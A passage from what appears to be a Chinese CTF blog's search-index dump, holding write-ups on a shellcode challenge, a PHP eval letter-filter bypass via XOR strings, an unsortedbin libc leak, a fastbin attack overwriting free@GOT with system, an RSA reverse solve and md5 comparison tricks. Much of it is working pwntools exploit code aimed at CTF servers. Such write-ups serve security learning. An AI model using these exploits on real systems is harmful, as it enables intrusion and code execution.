0x80io.sendline(p)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"mrctf2020_shellcode","slug":"mrctf2020-shellcode","date":"2022-11-23T13:27:30.000Z","updated":"2022-11-23T13:41:11.077Z","comments":true,"path":"2022/11/23/mrctf2020-shellcode/","link":"","permalink":"http://example.com/2022/11/23/mrctf2020-shellcode/","excerpt":"","text":"这题虽然是很简单的shellcode 但是因为禁用了ida的反编译 需要我们阅读汇编理解程序 就当作提高汇编理解能力了 12345678[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments 没有开NX保护 可以在内存上执行系统调用 拖到ida后发现f5报错 于是只能阅读汇编代码 1234567891011121314151617181920212223242526272829.text:0000000000001155 ; __unwind &#123;.text:0000000000001155 push rbp.text:0000000000001156 mov rbp, rsp.text:0000000000001159 sub rsp, 410h.text:0000000000001160 mov rax, cs:stdin@@GLIBC_2_2_5.text:0000000000001167 mov esi, 0 ; buf.text:000000000000116C mov rdi, rax ; stream.text:000000000000116F call _setbuf.text:0000000000001174 mov rax, cs:stdout@@GLIBC_2_2_5.text:000000000000117B mov esi, 0 ; buf.text:0000000000001180 mov rdi, rax ; stream.text:0000000000001183 call _setbuf.text:0000000000001188 mov rax, cs:stderr@@GLIBC_2_2_5.text:000000000000118F mov esi, 0 ; buf.text:0000000000001194 mov rdi, rax ; stream.text:0000000000001197 call _setbuf.text:000000000000119C lea rdi, s ; &quot;Show me your magic!&quot; //断点1.text:00000000000011A3 call _puts.text:00000000000011A8 lea rax, [rbp+buf].text:00000000000011AF mov edx, 400h ; nbytes.text:00000000000011B4 mov rsi, rax ; buf .text:00000000000011B7 mov edi, 0 ; fd.text:00000000000011BC mov eax, 0.text:00000000000011C1 call _read //断点2.text:00000000000011C6 mov [rbp+var_4], eax.text:00000000000011C9 cmp [rbp+var_4], 0.text:00000000000011CD jg short loc_11D6 //断点3.text:00000000000011CF mov eax, 0.text:00000000000011D4 jmp short locret_11E4 断点1: 在这之前的汇编代码 执行了两步 一是清空缓存区 防止数据输入输出出现问题 第二步调用puts函数输出了一段字符串 断点2: 调用了read函数 可以手动反编译为read(0,buf,0x400) 断点3: 紧接着将**$eax的值赋给rbp+var_4** 与0进行比较 cmp的功能相当于减法指令，只是不保存结果 jg指令 如果大于就跳转 即如果$eax大于0就跳转到loc_11D6函数 1234.text:00000000000011D6 loc_11D6: ; CODE XREF: main+78↑j.text:00000000000011D6 lea rax, [rbp+buf].text:00000000000011DD call rax.text:00000000000011DF mov eax, 0 lea指令将$rbp+buf即我们上面通过read输入的变量的地址赋值给rax 随后利用call指令调用这个地址的内容 也就是说我们只要直接输入shellcode就可以做到系统调用 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import*def libcmath(function_addr,function_name): libc_addr = function_addr - libc.sym[function_name] system_addr = libc_addr + libc.sym[&#x27;system&#x27;] binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;)) return system_addr,binsh_addrdef csu(offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr): payload = cyclic(offset) payload += p64(gadget2_addr) payload += cyclic(0x8) payload += p64(0) payload += p64(1) payload += p64(call_addr) payload += p64(rdx) payload += p64(rsi) payload += p64(rdi) payload += p64(gadget1_addr) payload += cyclic(56) payload += p64(ret_addr) return payloaddef localconnect(filename): io = process(filename) return iodef remoteconnect(ip,port): io = remote(ip,port) return iodef elf_libc(filename,libc_name): elf = ELF(filename) libc = ELF(libc_name) return elf,libcdef debug(button): if(button==1): context.log_level = &quot;debug&quot;filename = &#x27;pwn&#x27;libc_name = &#x27;buu_libc_ubuntu16_64&#x27;ip=&quot;node4.buuoj.cn&quot;port=29656elf,libc = elf_libc(filename,libc_name)io = remoteconnect(ip,port)debug(1)io.recvuntil(&quot;Show me your magic!&quot;)context.arch = &quot;amd64&quot;shellcode = asm(shellcraft.sh())io.send(shellcode)io.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"HUBUCTF 2022 新生赛","slug":"HUBUCTF-2022-新生赛","date":"2022-11-22T09:03:24.000Z","updated":"2022-11-22T09:08:11.257Z","comments":true,"path":"2022/11/22/HUBUCTF-2022-新生赛/","link":"","permalink":"http://example.com/2022/11/22/HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B/","excerpt":"","text":"HowToGetShell1234567&lt;?phpshow_source(__FILE__);$mess=$_POST[&#x27;mess&#x27;];if(preg_match(&quot;/[a-zA-Z]/&quot;,$mess))&#123; die(&quot;invalid input!&quot;);&#125;eval($mess); 代码审计题 提供了eval函数 并且我们可以输入参数 但是preg_match正则匹配了字母 所以我们无法使用常规字符来构造payload 使得泄露flag https://blog.csdn.net/qq_38154820/article/details/106330233/ 翻阅到这篇文章 这里选择难度最为简单的异或办法 由两个字符串异或得到我们想要的字符串 123456789101112131415161718valid = &quot;1234567890!@$%^*()&#123;&#125;[];\\&#x27;\\&quot;,.&lt;&gt;/?-=_`~ &quot; answer = &quot;phpinfo&quot; tmp1,tmp2 = &#x27;&#x27;,&#x27;&#x27;for c in answer: for i in valid: for j in valid: if (ord(i)^ord(j) == ord(c)): tmp1 += i tmp2 += j break else: continue breakprint(tmp1,tmp2) 10302181 @[@[_^^ payload: 1mess=$_=&quot;0302181&quot;^&quot;@[@[_^^&quot;;$_(); 这里因为屏蔽了所有的字母 所以无法直接调用mess 只能通过命名一个参数为_然后调用这个参数","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[]},{"title":"unsortedbin泄露基址","slug":"unsortedbin泄露基址","date":"2022-11-21T11:50:21.000Z","updated":"2022-11-28T13:32:53.292Z","comments":true,"path":"2022/11/21/unsortedbin泄露基址/","link":"","permalink":"http://example.com/2022/11/21/unsortedbin%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80/","excerpt":"","text":"距离上一篇堆的知识点很长时间了 这段时间主要是自己基础的梳理了一些简单的堆漏洞利用手法 本文讲述unsortedbin在不同环境下的利用办法 这一部分还是比较简单的 基础知识这里先要有一个概念 在glibc版本2.26(可以简单记成18.04后)以后 新增了tcachebins 其机制会影响到堆块释放后进入unsortedbin 我们先留意一下随着glibc版本的不同 接着说回正文 一个堆块被释放以后 如果他的大小大于fastbin或者tcache的范围 那么他就会先进入unsortedbin 如果unsortedbin的链表中只有其一个堆块 那么他的fd域和bk域都将指向main_arean+0x88（这里的数值不是固定的） 此时如果用户再次申请一个chunk 1.如果该chunk的大小不超过unsortedbin中的chunk大小 那么就会分割出用户需要的 比如此时我再次申请一个0x40大小的堆块 就是从原来的free chunk中分割出来的 并且其fd和bk域的数值会保留下来 一起分配给了用户 所以我们可以利用这个特性泄露libc基址(如果程序有打印出chunk内容的机会) 这里有个小疑点 为什么用户新申请出来的chunk的fd和bk会和原来的chunk的不一样(待解) 实战利用 ubuntu16.04123456[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 自己编译了一个简单的堆题 程序主体就简单发一下各函数就行了 内容也不必看 就知道有个打印chunk内容的机会和堆溢出 uaf等漏洞 123456789101112131415161718192021222324252627282930313233343536int create()&#123; void *v0; // rax int v2; // [rsp+0h] [rbp-10h] BYREF int v3; // [rsp+4h] [rbp-Ch] BYREF void *v4; // [rsp+8h] [rbp-8h] printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); LODWORD(v0) = v3; if ( v3 &lt;= 31 ) &#123; v0 = *(&amp;Page + v3); if ( !v0 ) &#123; printf(&quot;Size &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); if ( v2 &gt; 256 ) &#123; LODWORD(v0) = puts(&quot;over size&quot;); &#125; else &#123; v0 = malloc(v2); v4 = v0; if ( v0 ) &#123; *(&amp;Page + v3) = v4; Size[v3] = v2; LODWORD(v0) = puts(&quot;OK&quot;); &#125; &#125; &#125; &#125; return v0;&#125; 12345678910111213141516171819__int64 edit()&#123; __int64 result; // rax unsigned int v1; // [rsp+Ch] [rbp-4h] BYREF printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); result = v1; if ( v1 &lt;= 31 ) &#123; result = *(&amp;Page + v1); if ( result ) &#123; printf(&quot;Content: &quot;); result = vuln(*(&amp;Page + v1), Size[v1]); &#125; &#125; return result;&#125; 123456789101112int show()&#123; int result; // eax int v1; // [rsp+Ch] [rbp-4h] BYREF printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); result = v1; if ( v1 &lt;= 31 ) result = printf(&quot;Content: %s\\n&quot;, *(&amp;Page + v1)); return result;&#125; 1234567891011121314151617__int64 del()&#123; __int64 result; // rax unsigned int v1; // [rsp+Ch] [rbp-4h] BYREF printf(&quot;Index: &quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v1); result = v1; if ( v1 &lt;= 31 ) &#123; free(*(&amp;Page + v1)); *(&amp;Page + v1) = 0LL; result = v1; Size[v1] = 0; &#125; return result;&#125; gdb动调exp: 123456789101112131415161718192021222324252627282930313233343536373839from pwn import*io = process(&quot;./pwn&quot;)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;def create(index,size): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size &quot;) io.sendline(str(size))def edit(index,payload): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(payload)def delete(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))create(1,0x88)create(2,0x20)delete(1)create(3,0x48)show(3)io.recv() 12345[DEBUG] Received 0x2e bytes: 00000000 43 6f 6e 74 65 6e 74 3a 20 f8 7b d4 61 1a 7f 0a │Cont│ent:│ ·&#123;·│a···│ 00000010 31 2e 41 44 44 0a 32 2e 43 48 41 4e 47 45 0a 33 │1.AD│D·2.│CHAN│GE·3│ 00000020 2e 50 52 49 4e 54 0a 34 2e 44 45 4c 0a 3a │.PRI│NT·4│.DEL│·:│ 0000002e 最后成功泄露出libc地址 ubuntu 18.04二进制文件同上 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import*io = process(&quot;./heap&quot;)elf = ELF(&quot;./heap&quot;)context.log_level = &quot;debug&quot;def create(index,size): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Size &quot;) io.sendline(str(size))def edit(index,payload): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index)) io.recvuntil(&quot;Content: &quot;) io.sendline(payload)def delete(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;4&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))def show(index): io.recvuntil(&quot;:&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index: &quot;) io.sendline(str(index))create(1,0x90)create(2,0x20)for i in range(3,10): create(i,0x90)for i in range(3,10): delete(i)delete(1)create(10,0x90)show(10) 办法就是利用 tcachebin的一条链表中只能存放7个chunk 只要我们把其填满了 那么再次释放一个相同大小的chunk就会进入unsortedbin 这里将我们最开始申请的chunk1释放以后 其就因为对应的tcachebin中位置已满 所以进入了unsortedbin 那么接下来利用show函数输出即可 12345[DEBUG] Received 0x2e bytes: 00000000 43 6f 6e 74 65 6e 74 3a 20 30 7d 05 ac 42 7f 0a │Cont│ent:│ 0&#125;·│·B··│ 00000010 31 2e 41 44 44 0a 32 2e 43 48 41 4e 47 45 0a 33 │1.AD│D·2.│CHAN│GE·3│ 00000020 2e 50 52 49 4e 54 0a 34 2e 44 45 4c 0a 3a │.PRI│NT·4│.DEL│·:│ 0000002e 这里同时也说明了一点 当tcachebin和unsortedbin中都有free chunk时 且用户申请的chunk大小小于等于二者时unsortedbin优先提供给用户 总结进行一个总结 ubuntu16和18的区别在于 18及以上的版本多出了tcachebin 其虽然和fastbin一样都是单链表结构 但是fastbin利用篡改fd指针使得任意地址写的时候 对于fakechunk的size域有所要求 并且unsortedbin泄露基址的情况只有题目有给出打印堆内容的才有机会","categories":[{"name":"堆","slug":"堆","permalink":"http://example.com/categories/%E5%A0%86/"}],"tags":[]},{"title":"ZJCTF 2019.easyheap","slug":"ZJCTF-2019-easyheap","date":"2022-11-21T09:05:17.000Z","updated":"2022-11-21T09:30:03.111Z","comments":true,"path":"2022/11/21/ZJCTF-2019-easyheap/","link":"","permalink":"http://example.com/2022/11/21/ZJCTF-2019-easyheap/","excerpt":"","text":"这一题的预期解因为buu的docker环境问题无法实现 这里使用的是通过覆盖free_got表为system来系统调用 分析一下程序 123456[*] &#x27;/home/chen/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 没有开启FULL RELRO 意味着可以覆写got表 ida继续跟进 main函数很常规 这里重点关注一下add free edit这三个函数 1234567891011121314151617181920212223242526272829unsigned __int64 create_heap()&#123; int i; // [rsp+4h] [rbp-1Ch] size_t size; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); for ( i = 0; i &lt;= 9; ++i ) &#123; if ( !*(&amp;heaparray + i) ) &#123; printf(&quot;Size of Heap : &quot;); read(0, buf, 8uLL); size = atoi(buf); *(&amp;heaparray + i) = malloc(size); if ( !*(&amp;heaparray + i) ) &#123; puts(&quot;Allocate Error&quot;); exit(2); &#125; printf(&quot;Content of heap:&quot;); read_input(*(&amp;heaparray + i), size); puts(&quot;SuccessFul&quot;); return __readfsqword(0x28u) ^ v4; &#125; &#125; return __readfsqword(0x28u) ^ v4;&#125; 申请的堆块存储到了bss段上的heaparray数组里面 同时每个指针占据8个字节 12345678910111213141516171819202122232425262728293031unsigned __int64 edit_heap()&#123; int v1; // [rsp+4h] [rbp-1Ch] __int64 v2; // [rsp+8h] [rbp-18h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v4; // [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; printf(&quot;Size of Heap : &quot;); read(0, buf, 8uLL); v2 = atoi(buf); printf(&quot;Content of heap : &quot;); read_input(*(&amp;heaparray + v1), v2); puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v4;&#125; 提供了堆溢出的机会 可以供我们修改size域来合并chunk 123456789101112131415161718192021222324252627unsigned __int64 delete_heap()&#123; int v1; // [rsp+Ch] [rbp-14h] char buf[8]; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); printf(&quot;Index :&quot;); read(0, buf, 4uLL); v1 = atoi(buf); if ( v1 &lt; 0 || v1 &gt; 9 ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( *(&amp;heaparray + v1) ) &#123; free(*(&amp;heaparray + v1)); *(&amp;heaparray + v1) = 0LL; puts(&quot;Done !&quot;); &#125; else &#123; puts(&quot;No such heap !&quot;); &#125; return __readfsqword(0x28u) ^ v3;&#125; free后把指针清零了 没有办法uaf 了解完程序主体后 结合一下版本为ubuntu16 没有tcache 并且还有堆溢出 可以合并堆块 从而获得两个指向同一空间的chunk 这样就可以修改fastbinchunk的fd域 获得任意地址写的机会 接着再来关注一下这个heaparray 我们看完了代码后 可以得知 edit函数 是修改heaparray所指向的地址的内容 那如果我们利用上文提到的任意写的漏洞 将heaparray的其中一个指针修改为free_got 那么不就可以修改got表 成功进行系统调用了 不过fastbin attack需要注意的是 glibc对其取出bin时有检查机制 我们的fakechunk的地址需要合理构造 才能成功取出 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import*#io = process(&quot;./pwn&quot;)io = remote(&quot;node4.buuoj.cn&quot;,29611)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)def add(size,payload): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;1&quot;) io.recvuntil(&quot;Size of Heap : &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content of heap:&quot;) io.sendline(payload) io.recvuntil(&quot;SuccessFul&quot;)def edit(index,size,payload): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;2&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index)) io.recvuntil(&quot;Size of Heap : &quot;) io.sendline(str(size)) io.recvuntil(&quot;Content of heap : &quot;) io.sendline(payload) io.recvuntil(&quot;Done !&quot;)def delete(index): io.recvuntil(&quot;Your choice :&quot;) io.sendline(b&quot;3&quot;) io.recvuntil(&quot;Index :&quot;) io.sendline(str(index)) io.recvuntil(&quot;Done !&quot;)free_got = elf.got[&#x27;free&#x27;]system_addr = 0x400700heaparray_addr = 0x6020E0add(0x18,b&quot;1&quot;)#0add(0x68,b&quot;1&quot;)#1add(0x68,b&quot;1&quot;)#2add(0x20,b&quot;1&quot;)#3payload = cyclic(0x18)+p16(0xe1)edit(0,len(payload),payload)delete(1)add(0x68,b&quot;1&quot;)#4&amp;1add(0x68,b&quot;1&quot;)#5&amp;2delete(2)payload = p64(heaparray_addr-51)edit(4,len(payload),payload) 这部分代码的思路 我前面几题堆wp也有涉及 老办法了 不懂具体流程的可以翻看以往wp 重点在于最后我们要任意写的地方 位于heaparray-51的地方 这是为什么？ 我们gdb动调看看 如果不-51的话 此时我们想要伪造的chunk的size域值为878030 不符合glibc的检查机制 如果想要申请出来时 程序就会强行终止 1234567891011121314151617181920212223242526272829303132333435[DEBUG] Received 0x9b3 bytes: b&quot;*** Error in `./pwn&#x27;: malloc(): memory corruption (fast): 0x00000000006020f0 ***\\n&quot; b&#x27;======= Backtrace: =========\\n&#x27; b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f93309967f5]\\n&#x27; b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x82679)[0x7f93309a1679]\\n&#x27; b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f93309a31d4]\\n&#x27; b&#x27;./pwn[0x4009b5]\\n&#x27; b&#x27;./pwn[0x400ce1]\\n&#x27; b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f933093f840]\\n&#x27; b&#x27;./pwn[0x4007b9]\\n&#x27; b&#x27;======= Memory map: ========\\n&#x27; b&#x27;00400000-00402000 r-xp 00000000 08:01 1066204 /home/chen/pwn\\n&#x27; b&#x27;00601000-00602000 r--p 00001000 08:01 1066204 /home/chen/pwn\\n&#x27; b&#x27;00602000-00603000 rw-p 00002000 08:01 1066204 /home/chen/pwn\\n&#x27; b&#x27;02381000-023a2000 rw-p 00000000 00:00 0 [heap]\\n&#x27; b&#x27;7f932c000000-7f932c021000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7f932c021000-7f9330000000 ---p 00000000 00:00 0 \\n&#x27; b&#x27;7f9330709000-7f933071f000 r-xp 00000000 08:01 136633 /lib/x86_64-linux-gnu/libgcc_s.so.1\\n&#x27; b&#x27;7f933071f000-7f933091e000 ---p 00016000 08:01 136633 /lib/x86_64-linux-gnu/libgcc_s.so.1\\n&#x27; b&#x27;7f933091e000-7f933091f000 rw-p 00015000 08:01 136633 /lib/x86_64-linux-gnu/libgcc_s.so.1\\n&#x27; b&#x27;7f933091f000-7f9330adf000 r-xp 00000000 08:01 155906 /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27; b&#x27;7f9330adf000-7f9330cdf000 ---p 001c0000 08:01 155906 /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27; b&#x27;7f9330cdf000-7f9330ce3000 r--p 001c0000 08:01 155906 /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27; b&#x27;7f9330ce3000-7f9330ce5000 rw-p 001c4000 08:01 155906 /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27; b&#x27;7f9330ce5000-7f9330ce9000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7f9330ce9000-7f9330d0f000 r-xp 00000000 08:01 155898 /lib/x86_64-linux-gnu/ld-2.23.so\\n&#x27; b&#x27;7f9330ef4000-7f9330ef7000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7f9330f0d000-7f9330f0e000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7f9330f0e000-7f9330f0f000 r--p 00025000 08:01 155898 /lib/x86_64-linux-gnu/ld-2.23.so\\n&#x27; b&#x27;7f9330f0f000-7f9330f10000 rw-p 00026000 08:01 155898 /lib/x86_64-linux-gnu/ld-2.23.so\\n&#x27; b&#x27;7f9330f10000-7f9330f11000 rw-p 00000000 00:00 0 \\n&#x27; b&#x27;7ffc6a9c0000-7ffc6a9e1000 rw-p 00000000 00:00 0 [stack]\\n&#x27; b&#x27;7ffc6a9ed000-7ffc6a9f0000 r--p 00000000 00:00 0 [vvar]\\n&#x27; b&#x27;7ffc6a9f0000-7ffc6a9f2000 r-xp 00000000 00:00 0 [vdso]\\n&#x27; b&#x27;ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]\\n&#x27; 于是我们只好利用gdb动调 最后在-51的位置 可以使我们构造的chunk结构通过glibc的检查 1234567891011add(0x68,b&quot;/bin/sh&quot;)add(0x68,b&quot;1&quot;)payload = cyclic(51)+p64(free_got)edit(5,len(payload),payload)payload = p64(system_addr)edit(2,len(payload),payload)io.recvuntil(&quot;Your choice :&quot;)io.sendline(b&quot;3&quot;)io.recvuntil(&quot;Index :&quot;)io.sendline(b&quot;4&quot;)io.interactive() 随后我们将该chunk申请出来 并且计算一下偏移 将我们想要修改的heaparray覆盖成free_got 这样我们下次想要利用edit函数修改其内容时 就会转化成修改free_got的内容 然后我们释放掉一个内容为&#x2F;bin&#x2F;sh的堆块 就相当于执行了system（”&#x2F;bin&#x2F;sh”） 但是在这里我遇到了个问题 不能使用我们之前为了方便打包好的函数 因为多接收了个done 但是系统调用后并不会输出done 所以这里会有卡壳","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"SUCTF2019_signin","slug":"SUCTF2019-signin","date":"2022-11-20T08:00:42.000Z","updated":"2022-11-20T08:28:59.773Z","comments":true,"path":"2022/11/20/SUCTF2019-signin/","link":"","permalink":"http://example.com/2022/11/20/SUCTF2019-signin/","excerpt":"","text":"1234567891011121314151617181920212223242526__int64 __fastcall main(int a1, char **a2, char **a3)&#123; char v4[16]; // [rsp+0h] [rbp-4A0h] BYREF char v5[16]; // [rsp+10h] [rbp-490h] BYREF char v6[16]; // [rsp+20h] [rbp-480h] BYREF char v7[16]; // [rsp+30h] [rbp-470h] BYREF char v8[112]; // [rsp+40h] [rbp-460h] BYREF char v9[1000]; // [rsp+B0h] [rbp-3F0h] BYREF unsigned __int64 v10; // [rsp+498h] [rbp-8h] v10 = __readfsqword(0x28u); puts(&quot;[sign in]&quot;); printf(&quot;[input your flag]: &quot;); __isoc99_scanf(&quot;%99s&quot;, v8); sub_96A(v8, v9); __gmpz_init_set_str(v7, &quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;, 16LL); __gmpz_init_set_str(v6, v9, 16LL); __gmpz_init_set_str(v4, &quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;, 10LL); __gmpz_init_set_str(v5, &quot;65537&quot;, 10LL); __gmpz_powm(v6, v6, v5, v4); if ( __gmpz_cmp(v6, v7) ) puts(&quot;GG!&quot;); else puts(&quot;TTTTTTTTTTql!&quot;); return 0LL;&#125; 这一题涉及到的知识点非常多 所以写进博客记录一下 出现了不认识的系统函数 上网查阅一下其对应的作用 12345678910__gmpz_init_set_str 其实就是 mpz_init_set_str int mpz_init_set_str (mpz_t rop, const char *str, int base) 函数：这三个参数分别是多精度整数变量，字符串，进制。 这个函数的作用就是将 str 字符数组以 base 指定的进制解读成数值并写入 rop 所指向的内存。.void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod) 函数：其实就是计算 base 的 exp 次方，并对 mod 取模，最后将结果写入 rop 中， 这个运算的过程和RSA的加密过程一样。.接下来就是__gmpz_cmp函数，看这个函数名就知道这是比较函数。mpz_cmp(b, c)； //b 大于 c，返回 1；b等于 c，返回 0；b 小于 c，返回-1*/ 随后跟进一下sub_96A函数 看一下他对v8这个字符串进行了什么样的处理 1234567891011121314151617size_t __fastcall sub_96A(const char *a1, __int64 a2)&#123; size_t result; // rax int v3; // [rsp+18h] [rbp-18h] int i; // [rsp+1Ch] [rbp-14h] v3 = 0; for ( i = 0; ; i += 2 ) &#123; result = strlen(a1); if ( v3 &gt;= result ) break; *(a2 + i) = word_202010[a1[v3] &gt;&gt; 4]; //除以16 *(a2 + i + 1LL) = word_202010[a1[v3++] &amp; 0xF]; ///求余16 &#125; return result;&#125; word_202010这个数组跟进一下 查看内容 10123456789abcdef a2是v9 即一个空的数组 用来存放运算完的v8 看一下if的第一个语句 涉及到了&gt;&gt;右移运算符 (5条消息) 关于C&#x2F;C++左移右移运算符的总结_pineapple-coder的博客-CSDN博客 这其实就是一个转16进制的算法 将这两个十六进制数分开存储 比如输入字符 ‘1’ ，它的整数是49，49除16的整数是3，余数是1，在word_202010下标中分别对应3和1，构成的31就是字符 ‘1’的ASCII的十六进制形式，只不过是分开的十六进制，3 1 共两个字节 程序主体部分到这里已经了解清楚了 接下来就是逆向RSA加密 e&#x3D;65537 密文c&#x3D;0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35 n&#x3D;103461035900816914121390101299049044413950405173712170434161686539878160984549 浅析RSA算法 - 知乎 (zhihu.com) 首先我们需要分解出两个指数p q 利用工具得到 12p=282164587459512124844245113950593348271q=366669102002966856876605669837014229419 随后计算私匙 最后成功得到明文 1suctf&#123;Pwn_@_hundred_years&#125;","categories":[{"name":"reverse","slug":"reverse","permalink":"http://example.com/categories/reverse/"}],"tags":[]},{"title":"SWPUCTF 2021 新生赛","slug":"SWPUCTF-2021-新生赛","date":"2022-11-20T03:59:26.000Z","updated":"2022-11-24T12:58:54.579Z","comments":true,"path":"2022/11/20/SWPUCTF-2021-新生赛/","link":"","permalink":"http://example.com/2022/11/20/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B/","excerpt":"","text":"这篇用来记录SWPUCTF 2021 新生赛web刷题记录 gift_F1212345678910111213141516171819202122&lt;script language=&quot;javascript&quot;&gt; function show_date_time() &#123; flag = &quot;WLLMCTF&#123;We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft&#125;&quot;//flag is here window.setTimeout(&quot;show_date_time()&quot;, 1000); BirthDay = new Date(&quot;10/23/2021 00:00:00&quot;); today = new Date(); timeold = (BirthDay.getTime() - today.getTime()); sectimeold = timeold / 1000 secondsold = Math.floor(sectimeold); msPerDay = 24 * 60 * 60 * 1000 e_daysold = timeold / msPerDay daysold = Math.floor(e_daysold); e_hrsold = (e_daysold - daysold) * 24; hrsold = Math.floor(e_hrsold); e_minsold = (e_hrsold - hrsold) * 60; minsold = Math.floor((e_hrsold - hrsold) * 60); seconds = Math.floor((e_minsold - minsold) * 60); span_dt_dt.innerHTML = &quot;还有：&quot;+ daysold + &quot;天 &quot; + hrsold + &quot;小时 &quot; + minsold + &quot;分钟 &quot; + seconds + &quot;秒 &quot;; &#125; show_date_time();&lt;/script&gt; 查看网页源码后找到flag jicao123456789&lt;?phphighlight_file(&#x27;index.php&#x27;);include(&quot;flag.php&quot;);$id=$_POST[&#x27;id&#x27;];$json=json_decode($_GET[&#x27;json&#x27;],true);if ($id==&quot;wllmNB&quot;&amp;&amp;$json[&#x27;x&#x27;]==&quot;wllm&quot;)&#123;echo $flag;&#125;?&gt; 打开靶机后 给了一段源码 id需要post传参 x需要json传参 json传参格式 {“name”:”test”} 成功得到flag easy_md51234567891011121314151617181920&lt;?php highlight_file(__FILE__); include &#x27;flag2.php&#x27;; if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]))&#123; $name = $_GET[&#x27;name&#x27;]; $password = $_POST[&#x27;password&#x27;]; if ($name != $password &amp;&amp; md5($name) == md5($password))&#123; echo $flag; &#125; else &#123; echo &quot;wrong!&quot;; &#125; &#125;else &#123; echo &#x27;wrong!&#x27;;&#125;?&gt; 明文需要不同 但是密文需要相同 因为这里是松散比较 所以有两种办法 1.使用带0e开头的数字穿进行传递参数，因为php会将0e开头的数字转化为0，故此时md5值相等 